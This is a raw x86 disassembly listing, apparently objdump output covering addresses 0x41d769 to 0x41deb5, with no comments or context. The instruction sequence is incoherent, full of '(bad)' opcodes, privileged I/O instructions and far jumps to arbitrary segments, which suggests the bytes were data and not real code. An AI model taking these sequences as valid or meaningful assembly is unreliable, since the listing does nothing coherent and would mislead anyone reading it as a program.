  41d769:	push   ds
  41d76a:	jbe    0x41d754
  41d76c:	xor    ebp,DWORD PTR [ebp+edi*4+0x1c]
  41d770:	es dec ebp
  41d772:	icebp  
  41d773:	mov    ebp,0xf1d1b49d
  41d778:	in     al,0xeb
  41d77a:	mov    BYTE PTR [ebx-0x79a87f09],dh
  41d780:	add    al,0x77
  41d782:	add    eax,0xdc653305
  41d787:	call   0xd6408d7a
  41d78c:	dec    esi
  41d78d:	stos   DWORD PTR es:[edi],eax
  41d78e:	xlat   BYTE PTR ds:[ebx]
  41d78f:	mov    esi,0x1511ef9
  41d794:	ja     0x41d751
  41d796:	in     al,dx
  41d797:	cmp    edi,0xffffffa5
  41d79a:	addr16 loop 0x41d762
  41d79d:	adc    DWORD PTR [esi],esp
  41d79f:	mov    bl,0x5d
  41d7a1:	pop    ebx
  41d7a2:	fiadd  DWORD PTR [ebx-0x29a486bf]
  41d7a8:	cmp    DWORD PTR [ebx+0xe],ebp
  41d7ab:	mov    ch,0xaa
  41d7ad:	jp     0x41d7b7
  41d7af:	int    0x1
  41d7b1:	inc    edx
  41d7b2:	imul   edi,ebp,0x159929b2
  41d7b8:	add    BYTE PTR [edx+0x776e33e2],ah
  41d7be:	test   eax,0x7cc4bf02
  41d7c3:	(bad)  
  41d7c4:	jnp    0x41d7ea
  41d7c6:	sub    eax,0x378ee32a
  41d7cb:	push   0xffffffec
  41d7cd:	push   ebx
  41d7ce:	(bad)  
  41d7cf:	push   esi
  41d7d0:	xlat   BYTE PTR ds:[ebx]
  41d7d1:	xchg   esp,eax
  41d7d2:	jp     0x41d7f5
  41d7d4:	pop    eax
  41d7d5:	rcr    ebp,1
  41d7d7:	cmp    eax,0xcd66c6fa
  41d7dc:	xchg   ebp,eax
  41d7dd:	jl     0x41d772
  41d7df:	sub    eax,0x249e42f2
  41d7e4:	into   
  41d7e5:	push   edx
  41d7e6:	das    
  41d7e7:	adc    DWORD PTR [eax-0x30],esp
  41d7ea:	icebp  
  41d7eb:	dec    edx
  41d7ec:	mov    eax,0x53afaea9
  41d7f1:	cdq    
  41d7f2:	pop    ecx
  41d7f3:	xchg   esi,eax
  41d7f4:	and    ah,0xde
  41d7f7:	cmp    eax,0x9a096150
  41d7fc:	aaa    
  41d7fd:	lods   eax,DWORD PTR ds:[esi]
  41d7fe:	jb     0x41d7c7
  41d800:	nop    DWORD PTR [ecx+eiz*4]
  41d804:	int3   
  41d805:	and    BYTE PTR [edx-0x2b76a88c],0x9b
  41d80c:	out    0x47,al
  41d80e:	add    bl,BYTE PTR [ebp+esi*1-0x4]
  41d812:	popa   
  41d813:	addr16 push edi
  41d815:	test   al,0xf8
  41d817:	pop    edx
  41d818:	add    eax,0x8400145f
  41d81d:	push   0x8d7a6167
  41d822:	dec    edi
  41d823:	ror    DWORD PTR [ecx-0x78],cl
  41d826:	add    BYTE PTR [ecx-0x3c],dl
  41d829:	outs   dx,BYTE PTR ds:[esi]
  41d82a:	xor    DWORD PTR [esi+esi*8-0x69],esp
  41d82e:	adc    esi,DWORD PTR [bx+0x7488]
  41d833:	mov    eax,ds:0x4405416a
  41d838:	pushf  
  41d839:	icebp  
  41d83a:	je     0x41d812
  41d83c:	js     0x41d7f2
  41d83e:	add    BYTE PTR [ebx+0x7ae44ac2],ch
  41d844:	lds    eax,FWORD PTR [ecx]
  41d846:	aas    
  41d847:	jns    0x41d7e3
  41d849:	dec    ebp
  41d84a:	in     al,dx
  41d84b:	(bad)  
  41d84c:	jmp    0x41d803
  41d84e:	ret    
  41d84f:	call   0x6433:0x91411436
  41d856:	mov    cl,0x50
  41d858:	shr    DWORD PTR [esi+0x1f],1
  41d85b:	jge    0x41d8b4
  41d85d:	pop    edi
  41d85e:	inc    edi
  41d85f:	pusha  
  41d860:	add    ecx,DWORD PTR [ecx-0x4b6e6763]
  41d866:	sbb    bh,BYTE PTR [edx+ebx*4]
  41d869:	loopne 0x41d82f
  41d86b:	push   ds
  41d86c:	mov    ds:0x90b0d017,eax
  41d871:	sbb    al,0xee
  41d873:	icebp  
  41d874:	adc    BYTE PTR [edi-0x557db859],dh
  41d87a:	test   DWORD PTR [ebx+0x26ad5606],edx
  41d880:	cwde   
  41d881:	retf   0xc659
  41d884:	addr16 out dx,eax
  41d886:	mov    esi,0x8ab44681
  41d88b:	hlt    
  41d88c:	add    DWORD PTR ds:0x90eb810b,0xd7dde203
  41d896:	mov    ebp,DWORD PTR [esi-0x19cbcc98]
  41d89c:	jmp    0x3ae7:0x9d115d41
  41d8a3:	clc    
  41d8a4:	xor    eax,DWORD PTR [ecx+0x7e29fd24]
  41d8aa:	sub    eax,0x64ef1ada
  41d8af:	stos   BYTE PTR es:[edi],al
  41d8b0:	jl     0x41d853
  41d8b2:	rcr    DWORD PTR [edx],0xd0
  41d8b5:	jg     0x41d8b6
  41d8b7:	fs dec esp
  41d8b9:	test   al,0xe2
  41d8bb:	outs   dx,BYTE PTR ds:[esi]
  41d8bc:	xchg   esi,eax
  41d8bd:	test   BYTE PTR ds:0x9ea7e4f5,0x16
  41d8c4:	xchg   ebp,eax
  41d8c5:	daa    
  41d8c6:	mov    ?,WORD PTR [eax+0x53]
  41d8c9:	loop   0x41d92c
  41d8cb:	mov    eax,cs
  41d8cd:	pop    ecx
  41d8ce:	xor    edi,DWORD PTR [esp+esi*2-0x36b92858]
  41d8d5:	int    0xb5
  41d8d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8d8:	and    ah,bh
  41d8da:	std    
  41d8db:	jne    0x41d898
  41d8dd:	out    dx,eax
  41d8de:	mov    dl,BYTE PTR ds:0x18b607b1
  41d8e4:	push   0x5d985741
  41d8e9:	popa   
  41d8ea:	sub    ah,BYTE PTR [edi-0x71e660f6]
  41d8f0:	addr16 loope 0x41d873
  41d8f3:	push   0xe9a63bf
  41d8f8:	popf   
  41d8f9:	les    edi,FWORD PTR [ebx+0x16]
  41d8fc:	iret   
  41d8fd:	jmp    0x41d939
  41d8ff:	mov    ebx,0xa7995789
  41d904:	pop    ds
  41d905:	outs   dx,BYTE PTR ds:[esi]
  41d906:	xchg   ebx,eax
  41d907:	(bad)  
  41d908:	jl     0x41d961
  41d90a:	test   BYTE PTR [ebx+0x7d],ch
  41d90d:	push   esi
  41d90e:	add    eax,DWORD PTR [ebx+0x2576eb2b]
  41d914:	xchg   esi,eax
  41d915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d916:	or     eax,0x9d5dce4d
  41d91b:	es inc esi
  41d91d:	inc    esp
  41d91e:	out    dx,al
  41d91f:	jae    0x41d96e
  41d921:	stos   BYTE PTR es:[edi],al
  41d922:	jge    0x41d91a
  41d924:	mov    ds:0x246bbf86,eax
  41d929:	push   0xfffffff3
  41d92b:	jg     0x41d9a2
  41d92d:	ja     0x41d915
  41d92f:	pop    esi
  41d930:	je     0x41d97a
  41d932:	shl    DWORD PTR [ecx+ecx*4],cl
  41d935:	das    
  41d936:	pop    esp
  41d937:	loop   0x41d995
  41d939:	enter  0x4e78,0xfb
  41d93d:	aad    0x5e
  41d93f:	lds    ecx,FWORD PTR [edi+0x66]
  41d942:	and    DWORD PTR [eax-0x6b55a2cc],eax
  41d948:	push   edx
  41d949:	cmp    al,0x1d
  41d94b:	pop    ecx
  41d94c:	stc    
  41d94d:	mov    ebp,0xe0e44140
  41d952:	xor    esi,DWORD PTR [eax-0x350c7891]
  41d958:	add    eax,DWORD PTR [ebp-0x4dff3fd4]
  41d95e:	push   ss
  41d95f:	(bad)  
  41d960:	(bad)  
  41d961:	mov    cl,0x5e
  41d963:	push   eax
  41d964:	jne    0x41d90d
  41d966:	aam    0x44
  41d968:	xchg   edx,eax
  41d969:	mov    DWORD PTR ds:0xd8c8b0a2,ebp
  41d96f:	xchg   ebp,eax
  41d970:	scas   eax,DWORD PTR es:[edi]
  41d971:	mov    ebp,0x4657be8a
  41d976:	and    BYTE PTR [esi+0x5],ch
  41d979:	fsubr  DWORD PTR [eax-0x46]
  41d97c:	push   ss
  41d97d:	iret   
  41d97e:	mov    cl,0x8e
  41d980:	add    dl,BYTE PTR [ecx+0x7994edcc]
  41d986:	mov    al,0xf0
  41d988:	imul   esp,DWORD PTR fs:[edi],0x3f
  41d98c:	jp     0x41d9ec
  41d98e:	inc    eax
  41d98f:	cmp    edx,DWORD PTR [eax-0x36]
  41d992:	jmp    0xcbff:0xc65f35f8
  41d999:	or     al,0x93
  41d99b:	lahf   
  41d99c:	lods   al,BYTE PTR ds:[esi]
  41d99d:	mov    ch,BYTE PTR ds:0x3ee17868
  41d9a3:	mov    al,0xee
  41d9a5:	or     al,0xe1
  41d9a7:	sub    edx,DWORD PTR [edx]
  41d9a9:	push   0x8251acb0
  41d9ae:	into   
  41d9af:	add    BYTE PTR [ecx+0x3aa21097],ch
  41d9b5:	dec    ebx
  41d9b6:	jge    0x41d947
  41d9b8:	test   ch,ch
  41d9ba:	les    esi,FWORD PTR [ebx-0x65e0450f]
  41d9c0:	ficom  WORD PTR [edi]
  41d9c2:	inc    eax
  41d9c3:	jge    0x41d9b5
  41d9c5:	jne    0x41d9f7
  41d9c7:	cwde   
  41d9c8:	and    DWORD PTR [ecx],ebp
  41d9ca:	mov    ebp,ecx
  41d9cc:	stos   BYTE PTR es:[edi],al
  41d9cd:	gs and al,0x7a
  41d9d0:	inc    esi
  41d9d1:	mov    ah,0xc3
  41d9d3:	loop   0x41d9f4
  41d9d5:	int    0x2f
  41d9d7:	mov    ebp,0x6c0c8fe3
  41d9dc:	sub    BYTE PTR [ebx-0x23c4f893],cl
  41d9e2:	or     esi,DWORD PTR [eax]
  41d9e4:	mov    ecx,0xdef394e7
  41d9e9:	and    bh,cl
  41d9eb:	test   BYTE PTR [ecx+0x6a45b7e1],al
  41d9f1:	or     al,0x8f
  41d9f3:	or     edx,DWORD PTR [ebx-0x41]
  41d9f6:	pop    esi
  41d9f7:	push   ss
  41d9f8:	out    dx,al
  41d9f9:	popa   
  41d9fa:	call   0x948c:0x70307f0
  41da01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da02:	and    al,0x2e
  41da04:	into   
  41da05:	mov    ds:0xc4807552,eax
  41da0a:	shl    ebx,1
  41da0c:	ficomp WORD PTR [ecx-0x631f4558]
  41da12:	and    DWORD PTR [ebx+0x324ddded],ebp
  41da18:	repnz (bad) 
  41da1a:	(bad)  
  41da1c:	ins    DWORD PTR es:[edi],dx
  41da1d:	jl     0x41d9f2
  41da1f:	jno    0x41da91
  41da21:	stc    
  41da22:	sub    al,0xb2
  41da24:	pop    ebp
  41da25:	sub    eax,0xe2df7190
  41da2a:	xchg   ecx,eax
  41da2b:	inc    eax
  41da2c:	pop    edx
  41da2d:	push   esp
  41da2e:	or     al,0x78
  41da30:	cmp    al,BYTE PTR [edx]
  41da32:	ds inc eax
  41da34:	push   0x830618f1
  41da39:	out    dx,eax
  41da3a:	mov    ah,0xfb
  41da3c:	hlt    
  41da3d:	(bad)  
  41da3e:	push   esi
  41da3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da40:	jno    0x41d9d0
  41da42:	fwait
  41da43:	imul   eax,DWORD PTR [esi-0x20],0xf8c0ebd7
  41da4a:	jmp    0x41da52
  41da4c:	jns    0x41da4d
  41da4e:	sub    eax,ebx
  41da50:	imul   eax,ebp,0xfffffff5
  41da53:	mov    dl,0x1f
  41da55:	sahf   
  41da56:	jb     0x41d9fa
  41da58:	repz shr DWORD PTR [edi],1
  41da5b:	hlt    
  41da5c:	aam    0x2f
  41da5e:	mov    ch,BYTE PTR [edx-0x5c8d903c]
  41da64:	cmp    BYTE PTR [edi+0x43d00503],al
  41da6a:	imul   edx,DWORD PTR [edx-0x431f3d6d],0xfffffff0
  41da71:	and    DWORD PTR ds:0xfa7879a8,ebp
  41da77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da78:	popa   
  41da79:	jmp    0x842d:0x28a47aa5
  41da80:	mov    cl,0x84
  41da82:	aaa    
  41da83:	mov    ebx,cs
  41da85:	fild   DWORD PTR [eax+0x7da8a54a]
  41da8b:	adc    DWORD PTR [eax+0x69],eax
  41da8e:	data16 ins BYTE PTR es:[edi],dx
  41da90:	sub    al,0x13
  41da92:	rcl    cl,1
  41da94:	repz ja 0x41da9d
  41da97:	nop
  41da98:	out    0xf7,eax
  41da9a:	or     bh,BYTE PTR [ebx]
  41da9c:	xor    eax,0xd7cf0666
  41daa1:	ins    BYTE PTR es:[edi],dx
  41daa2:	(bad)  
  41daa3:	push   0x3c
  41daa5:	pushf  
  41daa6:	push   esp
  41daa7:	xchg   esp,eax
  41daa8:	inc    ebp
  41daa9:	and    al,0x1d
  41daab:	xchg   ecx,eax
  41daac:	cmp    ah,BYTE PTR [ecx-0x5cd6b09b]
  41dab2:	nop
  41dab3:	and    BYTE PTR [esp+ebx*2],al
  41dab6:	shl    DWORD PTR [edi-0x2e],1
  41dab9:	jecxz  0x41db07
  41dabb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dabc:	pop    edi
  41dabd:	pop    esi
  41dabe:	push   edi
  41dabf:	push   cs
  41dac0:	popf   
  41dac1:	xchg   ebp,eax
  41dac2:	jl     0x41db43
  41dac4:	adc    al,0xb5
  41dac6:	xchg   esp,eax
  41dac7:	bound  ecx,QWORD PTR [edx+0x5a4c226e]
  41dacd:	push   0xffffffb6
  41dacf:	dec    edx
  41dad0:	mov    al,ds:0xdd23b514
  41dad5:	ret    0x3395
  41dad8:	jo     0x41da93
  41dada:	into   
  41dadb:	pop    ebp
  41dadc:	add    eax,0xba077ddf
  41dae1:	stc    
  41dae2:	push   esi
  41dae3:	and    dh,cl
  41dae5:	xchg   edx,eax
  41dae6:	mov    ebx,0x62ea3391
  41daeb:	sar    BYTE PTR [ebx-0x69704201],cl
  41daf1:	in     al,0x59
  41daf3:	shr    BYTE PTR [ecx],0xbe
  41daf6:	pusha  
  41daf7:	adc    eax,0xccba58c
  41dafc:	fwait
  41dafd:	repnz lods al,BYTE PTR ds:[esi]
  41daff:	or     BYTE PTR [ebx+ebx*1-0xb704590],ch
  41db06:	pusha  
  41db07:	hlt    
  41db08:	sti    
  41db09:	or     DWORD PTR [ecx-0x1f729183],esi
  41db0f:	jbe    0x41daa2
  41db11:	pop    ecx
  41db12:	mov    ecx,0x82d7236a
  41db17:	(bad)  
  41db18:	pop    eax
  41db19:	xor    dh,bl
  41db1b:	enter  0xbe34,0x33
  41db1f:	xchg   ebp,eax
  41db20:	aam    0xdd
  41db22:	cmp    dh,BYTE PTR [edi+0x2bcbf88f]
  41db28:	test   edx,esp
  41db2a:	sbb    edi,DWORD PTR [ecx+edx*4+0x49f3a65f]
  41db31:	aaa    
  41db32:	cmp    al,0x47
  41db34:	add    ebp,esp
  41db36:	xlat   BYTE PTR ds:[ebx]
  41db37:	add    eax,0x7b4d00eb
  41db3c:	mov    dh,0xef
  41db3e:	pop    esi
  41db3f:	sub    al,0x97
  41db41:	pop    ecx
  41db42:	mov    gs,WORD PTR [esi+esi*4+0x65f8c9a6]
  41db49:	xchg   BYTE PTR [eax+ecx*1],ah
  41db4c:	(bad)  
  41db4d:	jge    0x41db69
  41db4f:	cli    
  41db50:	cmc    
  41db51:	xor    eax,0x797fc812
  41db56:	adc    eax,0x883a02a3
  41db5b:	push   es
  41db5c:	pop    ds
  41db5d:	es cwde 
  41db5f:	repnz dec ebp
  41db61:	jae    0x41db65
  41db63:	lea    esp,[ecx+0x2c]
  41db66:	fs aaa 
  41db68:	jb     0x41dbbd
  41db6a:	iret   
  41db6b:	cmp    BYTE PTR [esi],bl
  41db6d:	mov    al,ds:0x5d036333
  41db72:	dec    ecx
  41db73:	sub    eax,DWORD PTR [ebx]
  41db75:	rcr    BYTE PTR [ebx],0x92
  41db78:	and    al,0x94
  41db7a:	imul   ebx,edi,0x53
  41db7d:	push   ss
  41db7e:	sbb    al,0xba
  41db80:	mov    ebp,0xcc9606f8
  41db85:	fmul   DWORD PTR [esi+eax*8+0x6a]
  41db89:	or     esp,edx
  41db8b:	xchg   ebx,eax
  41db8c:	popa   
  41db8d:	fmul   QWORD PTR [ecx-0x4bd772a0]
  41db93:	(bad)  
  41db94:	sbb    al,0x2a
  41db96:	inc    eax
  41db97:	dec    ebx
  41db98:	popa   
  41db99:	add    BYTE PTR ds:[ecx+0x40c53340],bl
  41dba0:	test   al,0xab
  41dba2:	push   ebp
  41dba3:	xor    edx,ecx
  41dba5:	cdq    
  41dba6:	add    al,0xf3
  41dba8:	mov    ?,WORD PTR [ecx]
  41dbaa:	dec    eax
  41dbab:	add    eax,0xae56cc09
  41dbb0:	aas    
  41dbb1:	leave  
  41dbb2:	stos   DWORD PTR es:[edi],eax
  41dbb3:	jmp    0xefaad570
  41dbb8:	cld    
  41dbb9:	sub    eax,0xbcefcbaf
  41dbbe:	les    ebx,FWORD PTR [edx]
  41dbc0:	jnp    0x41dc29
  41dbc2:	(bad)  
  41dbc3:	fnstenv [esi-0x6a22b05d]
  41dbc9:	retf   0x30f1
  41dbcc:	lahf   
  41dbcd:	sar    DWORD PTR [eax+0x1fe6e3ee],0x79
  41dbd4:	and    bh,ch
  41dbd6:	addr16 inc ebx
  41dbd8:	rcr    DWORD PTR [edi+0x6c88646],0xc6
  41dbdf:	daa    
  41dbe0:	imul   DWORD PTR [edx]
  41dbe2:	outs   dx,BYTE PTR ds:[esi]
  41dbe3:	iret   
  41dbe4:	inc    edi
  41dbe5:	ss jno 0x41dbfa
  41dbe8:	mov    bh,0xcf
  41dbea:	xchg   esi,eax
  41dbeb:	xor    eax,0x4d3fe26
  41dbf0:	mov    bh,0xd8
  41dbf2:	scas   eax,DWORD PTR es:[edi]
  41dbf3:	sub    edi,edx
  41dbf5:	icebp  
  41dbf6:	ret    0x10cd
  41dbf9:	(bad)  
  41dbfa:	mov    WORD PTR [eax+0x69],gs
  41dbfd:	outs   dx,DWORD PTR ds:[esi]
  41dbfe:	pop    es
  41dbff:	pop    esp
  41dc00:	cmc    
  41dc01:	ins    BYTE PTR es:[edi],dx
  41dc02:	test   al,0x9a
  41dc04:	jmp    0x5dbe438e
  41dc09:	push   ecx
  41dc0a:	push   esp
  41dc0b:	mov    dl,cl
  41dc0d:	pop    eax
  41dc0e:	mov    eax,DWORD PTR [edi+0x6fcf516]
  41dc14:	and    eax,0xc10d8b9
  41dc19:	je     0x41dc0d
  41dc1b:	xchg   ecx,eax
  41dc1c:	(bad)  
  41dc1d:	jmp    0x2f9a:0x8e571b60
  41dc24:	ss das 
  41dc26:	loopne 0x41dbc0
  41dc28:	nop
  41dc29:	adc    al,0x31
  41dc2b:	adc    al,0x2c
  41dc2d:	cmp    BYTE PTR [ebx],0xc1
  41dc30:	xchg   esp,eax
  41dc31:	data16 or bh,ah
  41dc34:	stos   BYTE PTR es:[edi],al
  41dc35:	jp     0x41dc0c
  41dc37:	popf   
  41dc38:	push   ebx
  41dc39:	shl    bl,cl
  41dc3b:	xchg   ebp,eax
  41dc3c:	mov    DWORD PTR [eax+0x5c],ebx
  41dc3f:	cmp    ah,dl
  41dc41:	xchg   ch,dh
  41dc43:	sbb    ebx,DWORD PTR [ebx+0x1d]
  41dc46:	imul   BYTE PTR [ecx]
  41dc48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc49:	inc    edi
  41dc4a:	adc    ch,BYTE PTR [edi-0x607a71a2]
  41dc50:	inc    esp
  41dc51:	(bad)  
  41dc52:	sahf   
  41dc53:	jmp    0x601:0x4bbdf65d
  41dc5a:	bnd call 0xd711db52
  41dc60:	push   eax
  41dc61:	test   esp,esi
  41dc63:	adc    DWORD PTR [ebx],0x4a
  41dc66:	and    ecx,eax
  41dc68:	jmp    0x41dc75
  41dc6a:	push   ebp
  41dc6b:	and    BYTE PTR [edx+eax*2],ch
  41dc6e:	jno    0x41dc39
  41dc70:	shl    eax,0xe7
  41dc73:	inc    edx
  41dc74:	sub    BYTE PTR [ebp+0x20],bh
  41dc77:	xchg   ebx,eax
  41dc78:	nop
  41dc79:	outs   dx,BYTE PTR ds:[esi]
  41dc7a:	mov    edi,0xafaa6e59
  41dc7f:	and    eax,0x21644b6b
  41dc84:	sub    eax,ebp
  41dc86:	dec    esi
  41dc87:	push   ecx
  41dc88:	rcr    edx,0x9b
  41dc8b:	shr    DWORD PTR [eax+0x7],cl
  41dc8e:	sub    ch,BYTE PTR [edi+0x22]
  41dc91:	inc    edx
  41dc92:	cmp    BYTE PTR [ebx],0x4
  41dc95:	cmp    edx,esi
  41dc97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc98:	jae    0x41dc53
  41dc9a:	daa    
  41dc9b:	nop
  41dc9c:	xchg   ebx,eax
  41dc9d:	stos   BYTE PTR es:[edi],al
  41dc9e:	(bad)  
  41dca0:	sub    cl,ah
  41dca2:	jp     0x41dc76
  41dca4:	shl    BYTE PTR [esi+0x5755b592],0x72
  41dcab:	scas   al,BYTE PTR es:[edi]
  41dcac:	mov    ebp,ecx
  41dcae:	sbb    bh,BYTE PTR [ebx+0x5f]
  41dcb1:	into   
  41dcb2:	mov    esi,0xf026eda5
  41dcb7:	out    0xec,al
  41dcb9:	xchg   ebx,edi
  41dcbb:	push   cs
  41dcbc:	mov    ds:0x376be6fc,al
  41dcc1:	mov    esp,esp
  41dcc3:	sub    eax,0xcea5bca8
  41dcc8:	arpl   di,cx
  41dcca:	aam    0x37
  41dccc:	mov    edx,0x45ce9b0b
  41dcd1:	arpl   ax,si
  41dcd3:	add    cl,bh
  41dcd5:	lods   eax,DWORD PTR ds:[esi]
  41dcd6:	or     BYTE PTR [ecx+ecx*8],dl
  41dcd9:	jne    0x41dcc2
  41dcdb:	in     al,dx
  41dcdc:	dec    ecx
  41dcdd:	inc    esi
  41dcde:	cmc    
  41dcdf:	sub    al,BYTE PTR [edx]
  41dce1:	scas   al,BYTE PTR es:[edi]
  41dce2:	xchg   esi,eax
  41dce3:	mov    bl,0x70
  41dce5:	pop    esi
  41dce6:	mov    dl,0xaf
  41dce8:	push   edi
  41dce9:	pop    esp
  41dcea:	push   ebx
  41dceb:	inc    ecx
  41dcec:	xchg   esp,eax
  41dced:	inc    edx
  41dcee:	xchg   BYTE PTR [ecx+0x44],bh
  41dcf1:	mov    ah,0x73
  41dcf3:	mov    bl,0xe0
  41dcf5:	jp     0x41dd41
  41dcf7:	stos   DWORD PTR es:[edi],eax
  41dcf8:	xchg   edx,eax
  41dcf9:	dec    ebp
  41dcfa:	ss scas al,BYTE PTR es:[edi]
  41dcfc:	pop    eax
  41dcfd:	es push es
  41dcff:	or     bl,BYTE PTR [esp+edi*4]
  41dd02:	cwde   
  41dd03:	pop    ebx
  41dd04:	popa   
  41dd05:	mov    ebp,0xe8e49d69
  41dd0a:	scas   eax,DWORD PTR es:[edi]
  41dd0b:	sar    DWORD PTR [ebx-0x1d],cl
  41dd0e:	dec    edx
  41dd0f:	sub    edi,DWORD PTR [ebp+ecx*8+0x6b8b21ca]
  41dd16:	pop    edx
  41dd17:	inc    BYTE PTR [ecx]
  41dd19:	cs or  al,0x71
  41dd1c:	add    esi,esp
  41dd1e:	mov    esp,ecx
  41dd20:	push   edx
  41dd21:	ds out 0xca,eax
  41dd24:	mov    cl,0xb9
  41dd26:	sbb    DWORD PTR [edi],ebp
  41dd28:	and    ah,bh
  41dd2a:	sbb    DWORD PTR [eax],0x88563687
  41dd30:	push   edx
  41dd31:	adc    cl,BYTE PTR [ebp-0x549e4f70]
  41dd37:	jo     0x41dd25
  41dd39:	mov    dh,0xcd
  41dd3b:	cs xchg ebx,eax
  41dd3d:	into   
  41dd3e:	pop    ecx
  41dd3f:	fs jbe 0x41dd79
  41dd42:	inc    eax
  41dd43:	sub    edx,DWORD PTR [esi-0xa51845e]
  41dd49:	fiadd  DWORD PTR [eax+0x17d1f6c7]
  41dd4f:	enter  0x625e,0x44
  41dd53:	or     eax,0xe29fd9c2
  41dd58:	and    eax,0x8b4923d1
  41dd5d:	inc    esp
  41dd5e:	aas    
  41dd5f:	push   ss
  41dd60:	out    dx,al
  41dd61:	scas   al,BYTE PTR es:[di]
  41dd63:	cmp    ecx,ecx
  41dd65:	mov    eax,ds:0xb863520d
  41dd6a:	and    DWORD PTR [ebx-0x72],edi
  41dd6d:	sub    bl,BYTE PTR [esi-0x5d]
  41dd70:	out    dx,eax
  41dd71:	in     al,dx
  41dd72:	cmc    
  41dd73:	loope  0x41dd56
  41dd75:	push   edi
  41dd76:	aam    0xd1
  41dd78:	scas   eax,DWORD PTR es:[edi]
  41dd79:	into   
  41dd7a:	sahf   
  41dd7b:	sub    ch,dl
  41dd7d:	int3   
  41dd7e:	xor    esi,DWORD PTR [edx]
  41dd80:	fs into 
  41dd82:	retf   
  41dd83:	into   
  41dd84:	arpl   ax,dx
  41dd86:	mov    bl,0x67
  41dd88:	sbb    edx,esi
  41dd8a:	mov    al,0xa9
  41dd8c:	jbe    0xb01215e4
  41dd92:	inc    ecx
  41dd93:	rol    cl,1
  41dd95:	dec    ebp
  41dd96:	mov    dh,BYTE PTR [edx]
  41dd98:	jg     0x41dd4a
  41dd9a:	mov    cl,0xa6
  41dd9c:	ficomp WORD PTR [ebx]
  41dd9e:	pop    esi
  41dd9f:	xchg   esp,eax
  41dda0:	test   DWORD PTR [esi+0x39],eax
  41dda3:	or     ch,cl
  41dda5:	and    esi,DWORD PTR [ebx+eax*1+0x679496bb]
  41ddac:	push   edi
  41ddad:	ja     0x41de0d
  41ddaf:	rcl    DWORD PTR [edx],cl
  41ddb1:	les    ecx,FWORD PTR [ebp+0x707d33a]
  41ddb7:	push   esi
  41ddb8:	(bad)  
  41ddb9:	and    al,0x4d
  41ddbb:	test   al,0x76
  41ddbd:	mov    esi,0xdd80033e
  41ddc2:	psrlq  mm5,mm2
  41ddc5:	inc    edi
  41ddc6:	(bad)  
  41ddc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddc8:	sbb    BYTE PTR [edi+0x71],ch
  41ddcb:	retf   
  41ddcc:	aam    0xfe
  41ddce:	adc    ebp,esp
  41ddd0:	or     BYTE PTR ds:0xd078e82d,ah
  41ddd6:	nop
  41ddd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddd8:	mov    al,ds:0xdccd4f1f
  41dddd:	popf   
  41ddde:	ret    
  41dddf:	jmp    0x41ddb3
  41dde1:	sar    BYTE PTR [eax-0x5948e6f],cl
  41dde7:	jp     0x41de65
  41dde9:	lods   eax,DWORD PTR ds:[esi]
  41ddea:	fcmovu st,st(6)
  41ddec:	adc    al,0xc7
  41ddee:	xor    ecx,DWORD PTR [edx]
  41ddf0:	inc    edi
  41ddf1:	xlat   BYTE PTR ds:[ebx]
  41ddf2:	dec    esi
  41ddf3:	mov    al,ds:0x7aac87ca
  41ddf8:	sar    BYTE PTR [eax+0x362c1eea],cl
  41ddfe:	fmulp  st(2),st
  41de00:	(bad)  
  41de01:	sbb    eax,0x743a3afd
  41de06:	inc    edi
  41de07:	push   cs
  41de08:	outs   dx,DWORD PTR ds:[esi]
  41de09:	mov    esp,DWORD PTR [edi]
  41de0b:	or     ah,BYTE PTR [edi]
  41de0d:	icebp  
  41de0e:	mov    al,0xf2
  41de10:	xor    eax,0x8b1afb94
  41de15:	xchg   edi,eax
  41de16:	mul    DWORD PTR [ebx-0x20]
  41de19:	inc    esp
  41de1a:	pop    ds
  41de1b:	nop
  41de1c:	and    BYTE PTR [ebx],0x22
  41de1f:	fcmovne st,st(7)
  41de21:	out    0x15,al
  41de23:	fidivr DWORD PTR [ebp-0x4fa54304]
  41de29:	add    eax,0x2fcaf813
  41de2e:	mov    dh,0x63
  41de30:	sub    eax,0x7d7370c2
  41de35:	adc    eax,0xadc2d498
  41de3a:	lods   al,BYTE PTR ds:[esi]
  41de3b:	lds    edx,FWORD PTR [ecx-0x7b]
  41de3e:	cmp    ebx,DWORD PTR [esi+eax*2+0x3c]
  41de42:	jae    0x41de32
  41de44:	rcl    BYTE PTR [edi+0x686bef32],0xe9
  41de4b:	add    esp,DWORD PTR [ebx-0x16]
  41de4e:	fbstp  TBYTE PTR [edx+0xc74dad2]
  41de54:	jns    0x41de40
  41de56:	pop    esp
  41de57:	(bad)  
  41de58:	jbe    0x41de20
  41de5a:	adc    BYTE PTR [ecx+0x5b],bl
  41de5d:	ds mov ah,bl
  41de60:	aam    0x36
  41de62:	or     BYTE PTR [ecx+0x64],ah
  41de65:	je     0x41de36
  41de67:	mov    bh,0x76
  41de69:	xchg   ecx,eax
  41de6a:	iret   
  41de6b:	mov    edx,0x15e83d01
  41de70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de71:	clc    
  41de72:	sub    al,0x55
  41de74:	mov    esi,0x1032e7e9
  41de79:	pop    ds
  41de7a:	jecxz  0x41de9a
  41de7c:	leave  
  41de7d:	mov    WORD PTR ds:0x65b65c98,es
  41de83:	cmp    DWORD PTR fs:[edi-0x3a],ebx
  41de87:	sub    DWORD PTR [ebx+0x6c],eax
  41de8a:	mov    ds:0xe74e2b79,eax
  41de8f:	(bad)  
  41de90:	shr    cl,1
  41de92:	outs   dx,BYTE PTR ds:[esi]
  41de93:	mov    WORD PTR [eax-0x20a6aaf8],es
  41de99:	pop    edi
  41de9a:	packssdw mm7,QWORD PTR ds:0xce60d422
  41dea1:	jne    0x41defc
  41dea3:	mov    cl,0x57
  41dea5:	push   ss
  41dea6:	sbb    dh,dh
  41dea8:	adc    eax,0x7682d604
  41dead:	dec    esi
  41deae:	add    DWORD PTR [eax+0x3c],esp
  41deb1:	ss pusha 
  41deb3:	push   ecx
  41deb4:	stos   BYTE PTR es:[edi],al
  41deb5:	push   eax
